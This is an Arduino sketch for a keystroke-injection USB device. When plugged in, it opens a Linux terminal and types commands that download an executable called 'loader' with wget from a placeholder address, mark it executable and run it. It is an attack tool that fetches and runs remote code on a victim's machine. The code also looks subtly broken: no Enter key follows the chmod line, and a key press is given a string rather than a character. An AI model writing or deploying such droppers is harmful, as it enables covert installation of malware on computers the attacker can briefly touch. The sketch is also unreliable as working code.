#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(10);
  Keyboard.press(KEY_LEFT_ALT);
  delay(10);
  Keyboard.press("t");
  delay(10);
  Keyboard.releaseAll();

  delay(1500);
  Keyboard.print(F("clear"));

  delay(10);
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("wget -O loader <filedst>"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("chmod +x loader"));
  
    delay(50);
  Keyboard.print(F("./loader"));

  typeKey(KEY_RETURN);
}